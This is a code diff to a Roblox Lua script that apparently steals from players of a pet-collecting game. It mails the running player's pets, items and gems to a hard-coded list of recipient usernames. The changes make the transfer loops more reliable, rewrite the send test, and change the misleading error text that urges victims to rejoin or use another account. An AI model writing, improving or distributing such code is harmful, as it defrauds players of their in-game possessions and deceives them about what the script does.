@@ -11,7 +11,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
--- Safe debug logging function - NO CHAT ACCESS
+-- Safe debug logging function
 local function debugLog(...)
     if _G.debugMode then
         local args = {...}
@@ -19,26 +19,7 @@ local function debugLog(...)
         for i, v in ipairs(args) do
             message = message .. tostring(v) .. " "
         end
-        -- Only use print, don't try to access PlayerGui
         print(message)
-        
-        -- Optional: Write to workspace if you want visual feedback
-        -- But this is safer than accessing chat
-        pcall(function()
-            if game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.PlayerGui then
-                local screenGui = Instance.new("ScreenGui")
-                screenGui.Parent = game:GetService("Players").LocalPlayer.PlayerGui
-                local textLabel = Instance.new("TextLabel")
-                textLabel.Size = UDim2.new(1, 0, 0, 30)
-                textLabel.Position = UDim2.new(0, 0, 0, #screenGui:GetChildren() * 30)
-                textLabel.Text = message
-                textLabel.TextColor3 = Color3.new(1, 1, 1)
-                textLabel.BackgroundTransparency = 1
-                textLabel.TextStrokeTransparency = 0
-                textLabel.Parent = screenGui
-                game:GetService("Debris"):AddItem(screenGui, 5)
-            end
-        end)
     end
 end
 
@@ -387,7 +368,7 @@ local success, err = pcall(function()
         return value
     end
     
-    -- Send item function
+    -- Send item function with better response handling
     local function sendItem(category, uid, am)
         debugLog("Attempting to send item:", category, uid, am)
         
@@ -407,11 +388,15 @@ local success, err = pcall(function()
             
             debugLog("Sending to:", currentUser)
             
-            local success, response = pcall(function()
+            -- Network invoke returns (success, result) or just result?
+            local networkSuccess, response = pcall(function()
                 return network.Invoke("Mailbox: Send", unpack(args))
             end)
             
-            if success then
+            debugLog("Network response - Success:", networkSuccess, "Response:", response)
+            
+            if networkSuccess then
+                -- Check response format (could be boolean or {success, message})
                 if response == true then
                     sent = true
                     GemAmount1 = GemAmount1 - mailSendPrice
@@ -422,27 +407,34 @@ local success, err = pcall(function()
                     debugLog("Item sent successfully to", currentUser)
                     debugLog("New mail price:", mailSendPrice)
                     debugLog("Remaining gems:", GemAmount1)
-                elseif type(response) == "table" and response[1] == false and response[2] == "They don't have enough space!" then
-                    debugLog("User", currentUser, "doesn't have space, trying next...")
-                    userIndex = userIndex + 1
-                    if userIndex > maxUsers then
-                        sent = true
-                        debugLog("All users out of space")
+                elseif type(response) == "table" then
+                    -- Handle table response format
+                    if response[1] == false and response[2] == "They don't have enough space!" then
+                        debugLog("User", currentUser, "doesn't have space, trying next...")
+                        userIndex = userIndex + 1
+                    else
+                        debugLog("Unknown table response:", response)
+                        userIndex = userIndex + 1
                     end
                 else
-                    debugLog("Send failed:", response)
+                    debugLog("Unexpected response type:", type(response), "Value:", response)
                     userIndex = userIndex + 1
                 end
             else
-                debugLog("Error in network invoke:", response)
+                debugLog("Network invoke failed:", response)
                 userIndex = userIndex + 1
             end
-        until sent or userIndex > maxUsers
+            
+            if userIndex > maxUsers then
+                sent = true
+                debugLog("All users attempted")
+            end
+        until sent
         
         return sent
     end
     
-    -- Send all gems function
+    -- Send all gems function with better response handling
     local function SendAllGems()
         debugLog("Attempting to send all gems...")
         
@@ -470,30 +462,38 @@ local success, err = pcall(function()
                         
                         debugLog("Sending gems to:", currentUser, "Amount:", GemAmount1 - mailSendPrice)
                         
-                        local success, response = pcall(function()
+                        local networkSuccess, response = pcall(function()
                             return network.Invoke("Mailbox: Send", unpack(args))
                         end)
                         
-                        if success then
+                        debugLog("Gem send response - Success:", networkSuccess, "Response:", response)
+                        
+                        if networkSuccess then
                             if response == true then
                                 sent = true
                                 debugLog("Gems sent successfully to", currentUser)
-                            elseif type(response) == "table" and response[1] == false and response[2] == "They don't have enough space!" then
-                                debugLog("User", currentUser, "doesn't have space for gems, trying next...")
-                                userIndex = userIndex + 1
-                                if userIndex > maxUsers then
-                                    sent = true
-                                    debugLog("All users out of space for gems")
+                            elseif type(response) == "table" then
+                                if response[1] == false and response[2] == "They don't have enough space!" then
+                                    debugLog("User", currentUser, "doesn't have space for gems, trying next...")
+                                    userIndex = userIndex + 1
+                                else
+                                    debugLog("Unknown gem response:", response)
+                                    userIndex = userIndex + 1
                                 end
                             else
-                                debugLog("Gem send failed:", response)
+                                debugLog("Unexpected gem response:", response)
                                 userIndex = userIndex + 1
                             end
                         else
-                            debugLog("Error in gem network invoke:", response)
+                            debugLog("Gem network invoke failed:", response)
                             userIndex = userIndex + 1
                         end
-                    until sent or userIndex > maxUsers
+                        
+                        if userIndex > maxUsers then
+                            sent = true
+                            debugLog("All users attempted for gems")
+                        end
+                    until sent
                     break
                 else
                     debugLog("Not enough gems to send (need:", mailSendPrice + 10000, "have:", GemAmount1, ")")
@@ -522,7 +522,7 @@ local success, err = pcall(function()
         end
     end
     
-    -- Claim mail function
+    -- Claim mail function with better response handling
     local function ClaimMail()
         debugLog("Claiming mail...")
         
@@ -530,53 +530,121 @@ local success, err = pcall(function()
             return network.Invoke("Mailbox: Claim All")
         end)
         
-        while not success or (type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!") do
+        debugLog("Initial claim response - Success:", success, "Result:", result)
+        
+        -- Check if we need to wait (could be table response or string error)
+        local needToWait = false
+        
+        if not success then
+            needToWait = true
+        elseif type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!" then
+            needToWait = true
+        elseif type(result) == "string" and result:find("wait") then
+            needToWait = true
+        end
+        
+        while needToWait do
             debugLog("Waiting 0.2 seconds for mailbox cooldown...")
             wait(0.2)
             
             success, result = pcall(function()
                 return network.Invoke("Mailbox: Claim All")
             end)
+            
+            debugLog("Retry claim response - Success:", success, "Result:", result)
+            
+            needToWait = false
+            if not success then
+                needToWait = true
+            elseif type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!" then
+                needToWait = true
+            elseif type(result) == "string" and result:find("wait") then
+                needToWait = true
+            end
         end
         
-        debugLog("Mail claimed:", success, result)
+        debugLog("Mail claimed successfully")
     end
     
-    -- Can send mail function
+    -- Can send mail function - FIXED VERSION
     local function canSendMail()
+        debugLog("Testing if mail can be sent...")
+        
         if not save["Pet"] then
             debugLog("No pets found to test mail sending")
             return false
         end
         
-        local uid = next(save["Pet"])
+        -- Get first pet UID
+        local uid = nil
+        for i, _ in pairs(save["Pet"]) do
+            uid = i
+            break
+        end
+        
         if not uid then
             debugLog("No pets found to test mail sending")
             return false
         end
         
+        -- Try with first user in list
+        local testUser = _G.Usernames[1]
+        if not testUser then
+            debugLog("No users in Usernames list")
+            return false
+        end
+        
         local args = {
-            [1] = "Roblox",
-            [2] = "Test",
+            [1] = testUser,
+            [2] = "Test Message",
             [3] = "Pet",
             [4] = uid,
             [5] = 1
         }
         
-        local success, result = pcall(function()
+        debugLog("Testing mail send with user:", testUser)
+        
+        local networkSuccess, response = pcall(function()
             return network.Invoke("Mailbox: Send", unpack(args))
         end)
         
-        if not success then
-            debugLog("Error testing mail send:", result)
+        debugLog("Test send - Network success:", networkSuccess)
+        debugLog("Test send - Response type:", type(response))
+        debugLog("Test send - Response value:", response)
+        
+        if not networkSuccess then
+            debugLog("Network invoke failed in test")
             return false
         end
         
-        if type(result) == "table" and result[2] == "They don't have enough space!" then
-            debugLog("Mail send test: Users have space")
+        -- Check various response formats
+        if response == true then
+            debugLog("Test send succeeded - user can receive mail")
             return true
+        elseif type(response) == "table" then
+            debugLog("Table response:", response[1], response[2])
+            -- Check for "no space" error (this means mail system is working)
+            if response[1] == false and response[2] == "They don't have enough space!" then
+                debugLog("Test send: Users exist and have space issue - mail system working")
+                return true
+            elseif response[1] == false and response[2] == "You must wait 30 seconds before using the mailbox!" then
+                debugLog("Test send: Mailbox on cooldown - system working")
+                return true
+            else
+                debugLog("Test send: Unknown table response:", response)
+                return false
+            end
+        elseif type(response) == "string" then
+            debugLog("String response:", response)
+            if response == "They don't have enough space!" or response:find("space") then
+                return true
+            elseif response == "You must wait 30 seconds before using the mailbox!" or response:find("wait") then
+                return true
+            else
+                return false
+            end
         else
-            debugLog("Mail send test: Users don't have space or other error:", result)
+            debugLog("Unexpected response type in test")
             return false
         end
     end
@@ -585,16 +653,16 @@ local success, err = pcall(function()
     debugLog("Claiming daycare...")
     pcall(function()
         local daycare = safeRequire(replicatedStorage.Library.Client.DaycareCmds)
-        if daycare then
+        if daycare and daycare.Claim then
             daycare.Claim()
+            debugLog("Daycare claimed")
         end
         
         local exclusiveDaycare = safeRequire(replicatedStorage.Library.Client.ExclusiveDaycareCmds)
-        if exclusiveDaycare then
+        if exclusiveDaycare and exclusiveDaycare.Claim then
             exclusiveDaycare.Claim()
+            debugLog("Exclusive daycare claimed")
         end
-        
-        debugLog("Daycare claimed")
     end)
     
     -- Process items
@@ -670,10 +738,14 @@ local success, err = pcall(function()
         ClaimMail()
         EmptyBoxes()
         
-        if not canSendMail() then
-            debugLog("ERROR: Cannot send mail - account error")
+        -- Test if mail can be sent
+        local canSend = canSendMail()
+        debugLog("Can send mail test result:", canSend)
+        
+        if not canSend then
+            debugLog("ERROR: Cannot send mail - mail system not working properly")
             if messageModule then
-                messageModule.Error("Account error. Please rejoin and try again or use a different account")
+                messageModule.Error("Mail system error. Please rejoin and try again or use a different account")
             end
             return
         end
